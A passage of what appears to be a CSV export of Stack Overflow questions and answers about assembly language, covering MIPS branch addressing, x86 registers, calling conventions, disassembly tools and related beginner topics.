<p>The performance critical part is obviously the 48 instructions inside the inner loop. You'll notice that it's broken into 4 blocks of 12 instructions each. Each of these 12 instructions blocks are completely independent from each other - and take on average 6 cycles to execute.</p>

<p>So there's 12 instructions and 6 cycles between issue-to-use. The latency of multiplication is 5 cycles, so it's just enough to avoid latency stalls.</p>

<p>The normalization step is needed to keep the data from over/underflowing. This is needed since the do-nothing code will slowly increase/decrease the magnitude of the data.</p>

<p>So it's actually possible to do better than this if you just use all zeros and get rid of the normalization step. However, since I wrote the benchmark to measure power consumption and temperature, <strong>I had to make sure the flops were on ""real"" data, rather than zeros</strong> - as the execution units may very well have special case-handling for zeros that use less power and produce less heat.</p>

<hr>

<h2>More Results:</h2>

<ul>
<li><strong>Intel Core i7 920 @ 3.5 GHz</strong></li>
<li>Windows 7 Ultimate x64</li>
<li>Visual Studio 2010 SP1 - x64 Release</li>
</ul>

<p><strong>Threads: 1</strong></p>

<pre><code>Seconds = 72.1116
FP Ops  = 960000000000
FLOPs   = 1.33127e+010
sum = 2.22652
</code></pre>

<p>Theoretical SSE Peak: 4 flops * 3.5 GHz = <strong>14.0 GFlops</strong>. Actual is <strong>13.3 GFlops</strong>.</p>

<p><strong>Threads: 8</strong></p>

<pre><code>Seconds = 149.576
FP Ops  = 7680000000000
FLOPs   = 5.13452e+010
sum = 17.8122
</code></pre>

<p>Theoretical SSE Peak: 4 flops * 4 cores * 3.5 GHz = <strong>56.0 GFlops</strong>. Actual is <strong>51.3 GFlops</strong>.</p>

<p><em><strong>My processor temps hit 76C on the multi-threaded run! If you runs these, be sure the results aren't affected by CPU throttling.</em></strong></p>

<hr>

<ul>
<li><strong>2 x Intel Xeon X5482 Harpertown @ 3.2 GHz</strong></li>
<li>Ubuntu Linux 10 x64</li>
<li>GCC 4.5.2 x64 - (-O2 -msse3 -fopenmp)</li>
</ul>

<p><strong>Threads: 1</strong></p>

<pre><code>Seconds = 78.3357
FP Ops  = 960000000000
FLOPs   = 1.22549e+10
sum = 2.22652
</code></pre>

<p>Theoretical SSE Peak: 4 flops * 3.2 GHz = <strong>12.8 GFlops</strong>. Actual is <strong>12.3 GFlops</strong>.</p>

<p><strong>Threads: 8</strong></p>

<pre><code>Seconds = 78.4733
FP Ops  = 7680000000000
FLOPs   = 9.78676e+10
sum = 17.8122
</code></pre>

<p>Theoretical SSE Peak: 4 flops * 8 cores * 3.2 GHz = <strong>102.4 GFlops</strong>. Actual is <strong>97.9 GFlops</strong>.</p>
","8391601"
"How to Calculate Jump Target Address and Branch Target Address?","60350","","<p>I am new to <strong>Assembly language</strong>. I was reading about <strong>MIPS</strong> architecture and I am stuck with <strong>Jump Target Address</strong> and <strong>Branch Target Address</strong> and <strong>how to calculate each</strong> of them.</p>

<p>I would be very thankful if anyone can help me out. 
Thanks in advance.</p>
","<h1><strong>1. Branch Address Calculation</strong></h1>

<p>In MIPS branch instruction has only 16 bits offset to determine next instruction. We need a register added to this 16 bit value to determine next instruction and this register is actually implied by architecture. It is PC register since PC gets updated (PC+4) during the fetch cycle so that it holds the address of the next instruction. We also limit the branch distance to <code>-2^15 to +2^15 - 1</code> instruction from the (instruction after the )branch instruction. However, this is not real issue since most branches are local anyway.</p>

<p><strong>So step by step :</strong></p>

<ul>
<li>Sign extend the 16 bit offset value to preserve its value.</li>
<li>Multiply resulting value with 4. The reason behind this is that If we are going to branch some address, and PC is already word aligned, then the immediate value has to be word-aligned as well. However, it makes no sense to make the immediate word-aligned because we would be wasting low two bits by forcing them to be 00.</li>
<li>Now we have 32 bit address. Add this value to PC + 4 and that is your branch address.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/CbO85.png"" alt=""Branch address calculation""></p>

<hr>

<h1><strong>2. Jump Address Calculation</strong></h1>

<p>For Jump instruction Mips has only 26 bits to determine Jump location. Besides, jumps are relative to PC in MIPS. Like branch, immediate jump value need to be word-aligned;therefore, we need to multiply 26 bit address with four. </p>

<p><strong>Again step by step:</strong></p>

<ul>
<li>Multiply 26 bit value with 4.</li>
<li>Since we are jumping relative to PC value, concatenate first four bits of PC value to left of our jump address.</li>
<li>Resulting address is the jump value.</li>
</ul>

<p>In other words, replace the lower 28 bits of the PC with the lower 26 bits of the 
fetched instruction shifted left by 2 bits.</p>

<p><img src=""https://i.stack.imgur.com/Cjn3Y.png"" alt=""enter image description here""></p>

<p><strong>Source:</strong> Bilkent University CS 224 Course Slides</p>
","9795721"
"How do you use gcc to generate assembly code in Intel syntax?","58799","","<p>The <code>gcc -S</code> option will generate assembly code in AT&amp;T syntax, is there a way to generate files in Intel syntax?  Or is there a way to convert between the two?</p>
","<p>Have you tried this?</p>

<pre><code>gcc -S -masm=intel test.c
</code></pre>

<p>Untested, but I found it in this <a href=""http://bytes.com/forum/thread215327.html"" rel=""noreferrer"">forum</a> where someone claimed it worked for them.</p>

<p>I just tried this on the mac and it failed, so I looked in my man page:</p>

<pre><code>   -masm=dialect
       Output asm instructions using selected dialect.  Supported choices
       are intel or att (the default one).  Darwin does not support intel.
</code></pre>

<p>It may work on your platform.</p>

<p>For Mac OSX:</p>

<pre><code>clang++ -S -mllvm --x86-asm-syntax=intel test.cpp
</code></pre>

<p>Source: <a href=""https://stackoverflow.com/a/11957826/950427"">https://stackoverflow.com/a/11957826/950427</a></p>
","200028"
"How to decompile an exe or a dll to assembly","58099","","<p>I am really interested in assembly language and I want to learn about how exe files work how dlls run etc... and I have an idea of writing an application to decompile an exe to assembly code since i am not a very good assembly programmer and with the lack of knowledge of the inner working of exe I couldn't do it. Since I can read an exe in hex i think it is not impossible but I don't know how to write my own program. Any resources or any help would be appreciated.</p>
","<p>I think you're looking for a disassembler not a decompiler. IDA pro seems to be popular and you can download an older version for free at <a href=""http://www.hex-rays.com/idapro/idadownfreeware.htm"" rel=""noreferrer"">http://www.hex-rays.com/idapro/idadownfreeware.htm</a></p>
","4565869"
"convert ASM to C (not reverse engineer)","57872","","<p>I googled and I see a suprising amount of flippant responses basically laughing at the asker for asking such a question.</p>

<p>Microchip provides some source code for free (I don't want to post it here in case that's a no-no.  Basically, google AN937, click the first link and there's a link for ""source code"" and its a zipped file).  Its in ASM and when I look at it I start to go cross-eyed.  I'd like to convert it to something resembling a c type language so that I can follow along.  Because lines such as:</p>

<pre><code>GLOBAL  _24_bit_sub
movf    BARGB2,w
subwf   AARGB2,f
</code></pre>

<p>are probably very simple but they mean nothing to me.</p>

<p>There must be some automated ASM to C translator out there but all I can find are people saying its impossible.  Frankly, its impossible for it to be impossible.  Both languages have structure and that structure surely can be translated.</p>

<p>thank you.</p>
","<p>You can absolutely make a c program from assembler.  The problem is it may not look like what you are thinking, or maybe it will.  My PIC is rusty but using another assembler, say you had</p>

<pre><code>add r1,r2
</code></pre>

<p>In C lets say that becomes</p>

<pre><code>r1 = r1 + r2;
</code></pre>

<p>Possibly more readable.  You lose any sense of variable names perhaps as values are jumping from memory to registers and back and the registers are being reused.  If you are talking about the older pics that had what two registers an accumulator and another, well it actually might be easier because variables were in memory for the most part, you look at the address, something like </p>

<pre><code>q = mem[0x12];
e = q;
q = mem[0x13];
e = e + q;
mem[0x12] = e;
</code></pre>

<p>Long and drawn out but it is clear that mem[0x12] = mem[0x12] + mem[0x13];</p>

<p>These memory locations are likely variables that will not jump around like compiled C code for a processor with a bunch of registers.  The pic might make it easier to figure out the variables and then do a search and replace to name them across the file.</p>

<p>What you are looking for is called a static binary translation, not necessarily a translation from one binary to another (one processor to another) but in this case a translation from pic binary to C.  Ideally you would want to take the assembler given in the app note and assemble it to a binary using the microchip tools, then do the translation.  You can do dynamic binary translation as well but you are even less likely to find one of those and it doesnt normally result in C but one binary to another.  Ever wonder how those $15 joysticks at wal-mart with pac-man and galaga work?  The rom from the arcade was converted using static binary translation, optimized and cleaned up and the C or whatever intermediate language compiled for the new target processor in the handheld box.  I imagine not all of them were done this way but am pretty sure some were.</p>

<p>The million dollar question, can you find a static binary translator for a pic?  Who knows, you probably have to write one yourself.  And guess what that means, you write a disassembler, and instead of disassembling to an instruction in the native assembler syntax like add r0,r1 you have your disassembler print out r0=r0+r1;   By the time you finish this disassembler though you will know the pic assembly language so well that you wont need the asm to C translator.  You have a chicken and egg problem.</p>
","1376921"
"What are the names of the new X86_64 processors registers?","56701","","<p>Where can I find the names of the new registers for assembly on this architecture?</p>

<p>I am referring to registers in X86 like EAX, ESP, EBX, etc. But I'd like them in 64bit.</p>

<p>I don't think they are the same as when I disassemble my C code, I get r's instead of e's.  </p>
","<p>The old 32-bit registers have been extended to 64 bits, the <code>r</code> registers (<code>rax</code>, <code>rbx</code>, <code>rsp</code> and so on).</p>

<p>In addition, there's some extra general purpose registers <code>r8</code> through <code>r15</code> which can also be accessed as (for example) <code>r8d</code>, <code>r8w</code> and <code>r8b</code> (the lower 32-bit double-word, 16-bit word and 8-bit byte respectively).</p>

<p>The high byte of the old 16-bit registers is still accessible, under many circumstances, as <code>ah</code>, <code>bh</code>, and so on, but this appears to not be the case for the <code>r8</code> through <code>r15</code> registers. There are some new <em>instruction encodings,</em> specifically those using the <code>REX</code> prefix, that can not access those high bytes, but others are still free to use them.</p>

<p>In addition, there's some new SSE registers, <code>xmm8</code> though <code>xmm15</code>.</p>

<p>The <code>eip</code> and <code>flags</code> registers have also been extended to <code>rip</code> and <code>rflags</code>.</p>

<p>See the <a href=""http://en.wikipedia.org/wiki/X86-64"" rel=""noreferrer"">wikipedia page</a> and <a href=""http://msdn.microsoft.com/en-us/library/ff561499.aspx"" rel=""noreferrer"">MSDN</a> for more details.</p>

<p>Whether these are supported in the <code>asm</code> keyword for a particular C compiler, I couldn't say. What little assembly I do (and it's becoming about one day a year) is done in assembly rather than C.</p>
","1753618"
"ret, retn, retf - how to use them","56686","","<p>I have the following asm code:</p>

<pre><code>; int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
_wWinMain@16 proc near

var_8= dword ptr -8
var_4= dword ptr -4
hInstance= dword ptr  8
hPrevInstance= dword ptr  0Ch
lpCmdLine= dword ptr  10h
nShowCmd= dword ptr  14h

push    ebp
mov     ebp, esp
sub     esp, 8
mov     [ebp+var_4], 5
mov     eax, [ebp+var_4]
add     eax, 1
mov     [ebp+var_8], eax
xor     eax, eax
mov     esp, ebp
pop     ebp
retn    10h
</code></pre>

<p>From what I read, you have 3 types of return instruction: ret, retn and retf, meaning return, return near and return far. They allow an optional argument nBytes, that I guess it's the number of bytes to pop, from the defined variables. When should I use retn or retf instead of ret? How can I calculate the optional parameter, nBytes?</p>
","<p>In the mnemonic ret N, N is the size of parameters on the stack. In this case it is 4 * 4 = 16 (10h) for 4 DWORDs.<br>
But this only applies to calling conventions when the callee is responsible for stack cleanup. In case of cdecl convention the ret should be without any numbers, as the caller is responsible for stack cleanup.</p>
","1396970"
"How do I disassemble raw x86 code?","55372","","<p>I'd like to disassemble the MBR (first 512 bytes) of a bootable x86 disk that I have.  I have copied the MBR to a file using</p>

<pre><code>dd if=/dev/my-device of=mbr bs=512 count=1
</code></pre>

<p>Any suggestions for a Linux utility that can disassemble the file <code>mbr</code>?</p>
","<p>You can use objdump. According to <a href=""http://prefetch.net/blog/index.php/2006/09/09/digging-through-the-mbr/"" rel=""noreferrer"">this article</a> the syntax is:</p>

<pre><code>objdump -D -b binary -mi386 -Maddr16,data16 mbr
</code></pre>
","1737105"
"Assembly programming memory Allocating EAX vs Ax, AH, AL","54681","","<p>My understanding of assembly registers say that each register can be accessed by the entire 32 bit code and it is broken into multiple accessible registers. In this example <code>EAX</code> being a 32 bit register, if we call <code>AX</code> it should return the first 16 bits, and if we call <code>AH</code> or <code>AL</code> it should return the next 8 bits after the 16 bits and <code>AL</code> should return the last 8 bits. </p>

<p>So my question, because I don't truly believe is this is how it operates. If we store a 32 bit value of seven... aka <code>EAX</code> storing</p>

<pre><code>0000 0000 0000 0000 0000 0000 0000 0111
</code></pre>

<p>So if we call <code>AX</code> it should return </p>

<pre><code>0000 0000 0000 0000
</code></pre>

<p>if we call <code>AH</code> it should return </p>

<pre><code>0000 0000
</code></pre>

<p>and when we call <code>AL</code> it should return </p>

<pre><code>0000 0111
</code></pre>

<p>Is this correct? and if it is what value does the call to <code>AH</code> truly provide?</p>
","<p>No, that's not quite right.</p>

<pre><code>EAX is the full 32-bit value
AX is the lower 16-bits
AL is the lower 8 bits
AH is the bits 8 through 15 (zero-based)
</code></pre>

<p>Edit: </p>

<p>For completeness, in addition to the above, which was based on a 32-bit CPU, 64-bit Intel/AMD CPUs have</p>

<pre><code>RAX, which hold a 64-bit value, and where EAX is mapped to the lower 32 bits.
</code></pre>
","15191217"
"Difference between ""move"" and ""li"" in MIPS assembly language","54029","","<p>I was practicing converting C code into MIPS assembly language, and am having trouble understanding the usage of <code>move</code> and <code>li</code> in variable assignment.</p>

<p>For example, to implement the following C line in MIPS:</p>

<pre><code>int x = 0;
</code></pre>

<p>If I understand it correctly (I highly doubt this, though), it looks like both of these work in MIPS assembler:</p>

<pre><code>move $s0, $zero
li $s0, $zero
</code></pre>

<p>Am I wrong? What is the difference between these two lines?</p>
","<p>The <code>move</code> instruction copies a value from one register to another. The <code>li</code> instruction loads a specific numeric value into that register.</p>

<p>For the <em>specific</em> case of zero, you can use either the constant zero or the zero register to get that:</p>

<pre><code>move $s0, $zero
li   $s0, 0
</code></pre>

<p>There's no register that generates a value other than zero, though, so you'd have to use <code>li</code> if you wanted some other number, like:</p>

<pre><code>li $s0, 12345678
</code></pre>
","19827723"
"What is the meaning of XOR in x86 assembly?","53742","","<p>I'm getting into assembly and I keep running into xor, for example:</p>

<pre><code>xor     ax, ax
</code></pre>

<p>Does it just clear the register's value?</p>
","<p><code>A XOR B</code> in english would be translated as ""are A and B not equal"". So <code>xor ax, ax</code> will set <code>ax</code> to zero since ax is always equal to itself.</p>

<pre><code>A B | A XOR B
0 0 | 0
1 0 | 1
0 1 | 1
1 1 | 0
</code></pre>
","4749620"
"Creating (and accessing) an array in MIPS","53567","","<p>I'm trying to create an array in MIPS Assembly, and then add all the elements together.  However, when I try to assemble the following, it says </p>

<blockquote>
  <p>Error in read_array line 1 position 7: "".word"" directive cannot appear in text segment
  Assemble: operation completed with errors.</p>
</blockquote>

<p>Here's my assembly:</p>

<pre><code>list: .word 3, 2, 1, 0, 1, 2
li $t0, 0x00000000  #initialize a loop counter to $t0
li $t4, 0x00000005  #last index of array
li $t3, 0x00000000  #this will hold our final sum
la $t1, list  #the address of list[0] is in $t1

loop: addi $t0, $t0, 0x00000001 #index++
  add $t5, $t0, $t0 #array index X2
  add $t5, $t0, $t0 #array index X2 again
  add $t6, $t5, $t1 #4x array index in $t6

  lw $t2, 0($t6)   #load list[index] into $t2
  add $t3, $t3, $t2 #$t3 = $t3 + $t2
  beq $t0, $t4, end
  j loop

end:
</code></pre>

<p>Thanks!</p>
","<p>You have to put this line:</p>

<pre><code>list: .word 3, 2, 1, 0, 1, 2
</code></pre>

<p>Into the <code>.data</code> section.  Check this <a href=""http://logos.cs.uic.edu/366/notes/MIPS%20Quick%20Tutorial.htm"" rel=""noreferrer"">quick tutorial</a>.</p>
","2368572"
"What is the best way to learn Assembly? Specifically, for someone who has experience in dynamic languages","52736","","<p>I've been using Python for quite some time now, and I absolutely love the ease of use and flexibility, but I really want to get closer to the hardware for some iter mathematics that I'm working on.  I'm also intrigued by being so close to the hardware, with absolutely nothing holding you back from using everything it has.</p>

<p>I've researched for introductions to Assembly and to me they go much faster than they should.  They jump straight into registers and operations without explaining what exactly they are, and why they matter.</p>

<p>I'd love to see an in-depth introduction to Assembly, to make sure you understand the concepts before proceeding to any kind of programming with it.</p>
","<p>As others have said, starting with a lower level language like <a href=""http://en.wikipedia.org/wiki/C_(programming_language)"" rel=""noreferrer"">C</a>/<a href=""http://en.wikipedia.org/wiki/C%2B%2B"" rel=""noreferrer"">C++</a> is a good start.  Familiarize yourself with their features, like <a href=""http://en.wikipedia.org/wiki/Pointer_(computing)"" rel=""noreferrer"">pointers</a>, references, <a href=""http://en.wikipedia.org/wiki/Mask_(computing)"" rel=""noreferrer"">bitmasks</a>, etc., and then attempt <a href=""http://en.wikipedia.org/wiki/Assembly_language"" rel=""noreferrer"">assembly</a>.</p>

<p>One tutorial I really like is the <a href=""http://pacman128.github.io/pcasm/"" rel=""noreferrer"">PC Assembly Tutorial</a> (the PDF can be found <a href=""http://pacman128.github.io/static/pcasm-book.pdf"" rel=""noreferrer"">here</a>) found here.  Until you create and run a simple program, and debug it, it will be difficult to understand assembly.</p>

<p>More importantly, knowing your <a href=""http://en.wikipedia.org/wiki/Von_Neumann_architecture"" rel=""noreferrer"">Von Neumann</a> <a href=""http://en.wikipedia.org/wiki/Computer_architecture"" rel=""noreferrer"">computer architecture</a> and other background information is extremely important: <a href=""http://en.wikipedia.org/wiki/CPU_design"" rel=""noreferrer"">processor design</a>, <a href=""http://en.wikipedia.org/wiki/Memory_controller"" rel=""noreferrer"">memory design</a>, <a href=""http://en.wikipedia.org/wiki/Computer_bus"" rel=""noreferrer"">bus architecture</a>, various <a href=""http://en.wikipedia.org/wiki/Cache"" rel=""noreferrer"">caches</a>, the <a href=""http://en.wikipedia.org/wiki/Binary_numeral_system"" rel=""noreferrer"">binary number system</a> and operations, etc.  It is impossible to understand assembly without a solid understanding of the math you are using and the hardware you are programming on, because you are so close to the hardware when programming at that level.</p>

<p>In many cases it's easier to learn on a simpler processor.  I learned first on a Java simulator which used a simpler derivative of the x86 instruction set, with fewer registers, then moved up to programming on a  <a href=""https://web.archive.org/web/20141122190615/http://www.mgtek.com/miniide/resources/hc12.aspx"" rel=""noreferrer"">Motorola MC68HC12</a> project board.</p>
","25639"
"What does MOV EAX, DWORD PTR DS:[ESI] mean and what does it do?","52589","","<p>Alright so I have this line in my assembly</p>

<pre><code>MOV EAX, DWORD PTR DS:[ESI]
</code></pre>

<p>where ESI is <code>00402050</code> (ascii, ""123456789012"")</p>

<p>After this instruction: <code>EAX = 34333231</code></p>

<p>What really happened here? How is this value calculated, and why?<br>
Where could I get some good reference on this kind of thing?</p>
","<p>Registers in square brackets such as <code>[ESI]</code> are dereferenced pointers.  The instruction you quote moves the <code>DWORD</code> (a 32-bit/4-byte value) in memory location specified by <code>ESI</code> into register <code>EAX</code>.  In your case, memory location <code>00402050</code>, read as a <code>DWORD</code>, contains <code>34333231</code>.</p>

<p>Written in pseudo-C:</p>

<pre><code>DWORD EAX;   /* Declaring the registers as we find them in silico */
DWORD ESI;

ESI = 0x00402050;  /* Set up your initial conditions for ESI */
EAX = *((DWORD *)ESI);   /* mov EAX, DWORD PTR [ESI] */
/*  ^ ^  ^^^^^^^    */
/*  | |     |       */
/*  | |     +-----------  From ""DWORD PTR"" we get ""DWORD *"" in C.          */
/*  | |             */ 
/*  | +-----------------  The C dereferencing operator * replaces [].      */
/*  |               */ 
/*  +-------------------  The C assignment operator = replaces mov opcode. */ 
</code></pre>

<p>In your case, it is not true that <code>0x00402050</code> ""equals"" the string <code>""1234567890""</code> -- rather it points to the memory which contains that string.</p>

<p>The value which you obtain, <code>0x34333231</code> is comprised from the ASCII values for the digits <code>""1234""</code>, which are the first four bytes (i.e., the first <code>DWORD</code>) of the string.  They appear in reversed order because the Intel architecture is ""little endian"" in the byte representation of a <code>DWORD</code> in memory.</p>

<p>In your example at this time, the <code>mov</code> instruction is loading ASCII characters as if they were the four bytes of an <code>unsigned long</code> value, when they are actually a string of single-byte characters.</p>
","3224614"
"How should I get started on writing device drivers?","51829","","<p>I would like to learn how to write device drivers because I think it would be fun. I use a Mac OS X Macbook, but I also have an Ubuntu machine (running on a Mac Min). I am pretty familiar with C and currently am reading <a href=""http://csapp.cs.cmu.edu/"" rel=""noreferrer"">this book</a>. I have found some links online such as <a href=""http://developer.apple.com/mac/library/referencelibrary/GettingStarted/GS_HardwareDrivers/index.html"" rel=""noreferrer"">Mac Dev Center</a>. I am doing this because it would be fun. I think there would be real gratification to see hardware operate because of software I wrote. </p>

<p>I guess what I would like is some tips or advice and guidance, and does anyone know of a list of devices that don't have drivers or can I write a driver for something that's already supported (would prefer the former so I'm actually providing value). What's a good device to get started with? Am I biting off more than I can chew? I'm not afraid of low level programming or assembly or whatever amount of effort is required. I'd like a challenge really!</p>
","<p>For Linux, you might look into picking up the O'Reilly <a href=""http://rads.stackoverflow.com/amzn/click/0596005903"" rel=""noreferrer"">Linux Device Drivers</a> book or reading <a href=""http://lwn.net/Kernel/LDD3/"" rel=""noreferrer"">PDFs</a> online.  In my opinion, it is one of the better texts around on the subject.  </p>

<p><a href=""http://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html"" rel=""noreferrer"">The Linux Kernel Module Programming Guide</a> is another good resource.</p>

<p>You may also want to pick up a book specifically on the Linux Kernel.  I picked up a copy of Robert Love's <a href=""http://rads.stackoverflow.com/amzn/click/0672327201"" rel=""noreferrer"">Linux Kernel Development (2nd Edition)</a> for this purpose (<a href=""http://rads.stackoverflow.com/amzn/click/0672329468"" rel=""noreferrer"">3rd Edition</a> on the way).</p>
","2222839"
"Compiling assembly in Visual Studio","51697","","<p>How do you compile assembly code using Visual Studio?</p>

<p>I want to compile and run an assembly source file in <a href=""http://en.wikipedia.org/wiki/Microsoft_Visual_Studio#Visual_Studio_2010"" rel=""nofollow noreferrer"">Visual&nbsp;Studio&nbsp;2010</a>.</p>

<p>I've created a Visual C++ project and inserted some assembly code in a file <code>code.asm</code>:</p>

<pre><code>.586              ;Target processor.  Use instructions for Pentium class machines
.MODEL FLAT, C    ;Use the flat memory model. Use C calling conventions
.STACK            ;Define a stack segment of 1KB (Not required for this example)
.DATA             ;Create a near data segment.  Local variables are declared after
                  ;this directive (Not required for this example)
.CODE             ;Indicates the start of a code segment.

clear PROC
   xor eax, eax 
   xor ebx, ebx 
   ret 
clear ENDP 
END
</code></pre>

<p>However the problem is when you try and compile this, you get:</p>

<pre><code>LINK : error LNK2001: unresolved external symbol _mainCRTStartup
</code></pre>

<p>I did go and enable the build customization <code>masm.targets</code> (right click project &gt; Build Customizations..), but to no avail.</p>
","<p>Sounds to me like the custom build rules for .asm files isn't enabled.  Right-click the project, Custom Build Rules, tick ""Microsoft Macro Assembler"".  With the ""END clear"" directive and disabling incremental linking I'm getting a clean build.</p>

<p>It's different starting from <strong>VS2010</strong>: </p>

<ol>
<li>Right-click <strong>Project</strong>, <strong>Build customizations</strong>, tick ""<strong>masm</strong>"".</li>
<li>Right-click the <code>.asm</code> file, <strong>Properties</strong>, change <strong>Item Type</strong> to ""<strong>Microsoft Macro Assembler</strong>"".</li>
</ol>
","4549741"
"What's the relationship between assembly language and machine language?","51247","","<p>Are assembly language and machine language (for the same underlying system) really the same? Are there any differences between these two concepts?</p>
","<p>Assembly language is a convenience mechanism over the machine language. With assembly language you use mnemonic sequences instead of numeric operation codes and can use symbolic labels instead of manually calculating offsets. It also protects you from really dumb errors - like typing a malformed processor instruction.</p>

<p>Otherwise the assemly language is the equivalent of the machine language. Sometimes you will have an old assembler that will not support mnemonics for some instructions of the newer processors - then you can still insert operation codes directly into the program.</p>
","1253278"
"Is it worthwile to learn assembly language?","50320","","<p>Is it still worthwhile to learn <em>ASM</em>? </p>

<p>I know a little of it, but I haven't really used it or learned it properly because everything I learn to do in assembler I can do in 1/10th the time with some language like C or C++. So, should I really learn and use ASM? Will it do me any good professionally? Will it increase my resourcefulness? In short, would it make me a better programmer?</p>

<p>Note: I am talking about low-level assembly like <em>FASM</em> or <em>NASM</em> and not something like <em>HLA</em> (High-Level Assembler).</p>
","<p>I learned from <a href=""http://rads.stackoverflow.com/amzn/click/013602212X"" rel=""noreferrer"">Kip Irvine's</a> book. If you ignore the (fair) criticisms of his (irrelevant) libraries, I can recommend it as a good introduction to the language itself -- although for the <em>really</em> interesting stuff you have to hunt out obsessives on the net.</p>

<p>I think it's useful to understand what happens at the lower levels. As you research assembler you will learn about cpu pipelining, branch prediction, cache alignment, SIMD, instruction reordering and so on. Knowledge of these will help you write better high-level code.</p>

<p>Furthermore, the conventional wisdom is to not try to hand-optimise assembly most of the time but let the compiler worry about it. When you see some examples of the twisted things that compilers generate, you will better understand why the conventional wisdom holds.</p>

<p>Example: LFSRs run fast with the rotate-with-carry instruction, for specific cases like this it's just as easy to write the assembler version as it is to discover whether or not the compiler is smart enough to figure it out. Sometimes <a href=""http://www.mactech.com/articles/mactech/Vol.15/15.06/FastBlitStrategies/index.html"" rel=""noreferrer"">you just know something</a> that the compiler doesn't.</p>

<p>It also increases you understanding of security issues -- write-or-execute, stack overruns, etc.</p>

<p>Some <a href=""http://www.hpl.hp.com/personal/Hans_Boehm/misc_slides/c++mm.pdf"" rel=""noreferrer"">concurrency</a> issues only become apparent when you are aware of what is happening at the per-instruction level.</p>

<p>It can be useful sometimes when debugging if you don't have the complete source code.</p>

<p>There's the curiousity value. How are virtual functions implemented anyway? Ever try to write DirectX or COM programs in assembler? How do large structures get returned, does the calling function offer a space for them or vice-versa?</p>

<p>Then there are special assembly languages for graphics hardware, although shader languages went high-level a few years ago, anything which lets you think about a problem a different way is good.</p>
","6623255"
"What are callee and caller saved registers?","50035","","<p>I'm having some trouble understanding the difference between caller and callee saved registers and when to use what. </p>

<p>I am using the MSP430
:</p>

<p>procedure:</p>

<pre><code>mov.w #0,R7 
mov.w #0,R6 
add.w R6,R7 
inc.w R6 
cmp.w R12,R6 
jl l$loop 
mov.w R7,R12
ret
</code></pre>

<p>the above code is a callee and was used in a textbook example so it follows the convention. R6 and R7 are callee saved and R12 is caller saved. My understanding is that the callee saved regs aren't ""global"" in the sense that changing its value in a procedure will not affect it's value outside the procedure. This is why you have to save a new value into the callee reg at the beginning.</p>

<p>R12, the caller saved is ""global"", for lack of better words. What the procedure does has a lasting effect on R12 after the call.</p>

<p>Is my understanding correct? Am I missing other things?</p>
","<blockquote>
  <p><strong>Caller-saved registers</strong> (AKA volatile registers) are used to hold temporary quantities that need
  not be preserved across calls.</p>
</blockquote>

<p>For that reason, it is the caller's responsibility to push these registers onto the stack if it wants to restore this value after a procedure call.</p>

<blockquote>
  <p><strong>Callee-saved registers</strong> (AKA non-volatile registers) are used to hold long-lived values that should
  be preserved across calls.</p>
</blockquote>

<p>When the caller makes a procedure call, it can expect that those registers will hold the same value after the callee returns, making it the responsibility of the callee to save them and restore them before returning to the caller.</p>

<p>Hope it helps.</p>
","16265609"
"explanation about push ebp and pop ebp instruction in assembly","49687","","<p>i used stack in assembly but i didn't got idea about push ebp  and pop ebp.    </p>

<pre><code>.intel_syntax noprefix

.include ""console.i""

.text

askl:   .asciz  ""Enter length: ""
askb:   .asciz  ""Enter breadth: ""
ans:    .asciz  ""Perimeter = ""

_entry:

    push    ebp     # establishing stack-frame
    mov ebp, esp
    sub esp, 12

    Prompt  askl
    GetInt  [ebp-4]     # length
    Prompt  askb
    GetInt  [ebp-8]     # breadth

    mov eax, [ebp-4]    # eax = l
    add eax, [ebp-8]    # eax = l + b
    add eax, eax    # eax = 2 * (l + b)
    mov [ebp-12], eax

    Prompt  ans
    PutInt  [ebp-12]
    PutEoL

    mov esp, ebp
    pop ebp     # unwinding stack-frame
    ret

.global _entry

.end
</code></pre>
","<p>I'm not sure if this is your doubt, but maybe you're wondering about this:</p>

<pre><code>push    ebp
mov ebp, esp
sub esp, 12
</code></pre>

<p>The first 2 lines are know as prolog assembly function. It stores the previous base pointer (ebp) and set the base pointer as it was the top of the stack. This means that all the stack contents is saved down the stack, so the function can push/pop in the stack.</p>

<p>The <code>sub esp,12</code> line is saving space for local variables in the function.</p>

<p>At the end you have:</p>

<pre><code>mov esp, ebp
pop ebp
ret
</code></pre>

<p>This is the inverse the prolog does, so the previous context can be restored.</p>

<p>Is this your doubt? :)</p>
","3638151"
"The meaning of RET in assembly","47803","","<p>I am very new to assembly, and I don't understand what it exactly means when, at the end of a proc, you write a number with the <code>ret</code> statement. </p>

<p>Like this:</p>

<pre><code>Function Proc
push ax cx
.
...body...
.
pop cx ax
ret 2 
Function endp
</code></pre>

<p>I understand it has something to do with where the stack pointer should return to at the end of the function? </p>

<p>Please, it would really help me if you could explain it easily.</p>
","<p>Yes, but <code>ret 2</code> also removes 2 bytes of parameters from the stack. Presumably, your function was called like:</p>

<pre><code>push some_parameter
call Function
</code></pre>

<p>At this point, a <code>cdecl</code> function - a ""caller cleans up"" function (Generally used by C) - would require <code>add sp, 2</code> to ""clean up the stack"", removing the parameter. Such a function would end in a plain <code>ret</code>.</p>

<p>A <code>stdcall</code> function, which is what you've got, is a ""callee cleans up"" function (used by Windows APIs, for example) doesn't require the <code>add sp, 2</code> - it has been done by the <code>ret 2</code>.</p>

<p>If you're not aware of it, <code>call</code> puts the return address on the stack (and <code>ret</code> pops it off), so you can't just <code>pop</code> to get the parameter inside your function.</p>
","17629058"
"What does OFFSET in 16 bit assembly code mean?","47585","","<p>I am going through some example assembly code for 16bit real mode. </p>

<p>I've come across the lines:</p>

<pre><code>    mov bx, cs
    mov    ds, bx
    mov    si, OFFSET value1
    pop    es
    mov     di, OFFSET value2
</code></pre>

<p>what is this doing? What does having 'OFFSET' there do? </p>

<p>Sorry if its a very basic question, i'm new at this.</p>
","<p>As some of the other answers say, the <code>offset</code> keyword refers to the offset from the segment in which it is defined.  Note, however, that segments may overlap and the offset in one segment may be different in another segment.  For instance, suppose you have the following segment in real mode</p>

<pre><code>data SEGMENT USE16 ;# at 02000h

    org 0100h
    foo db 0

    org 01100h
    bar db 0

data ENDS
</code></pre>

<p>And look at the following code:</p>

<pre><code>mov ax, 2000h
mov ds, ax

mov bx, offset foo ; bx = 0100h
mov byte ptr [bx], 10 ; foo = 10

mov ax, 3000h
mov ds, ax

mov bx, offset foo; bx = 0100h
mov byte ptr [bx], 10 ; bar = 10
</code></pre>

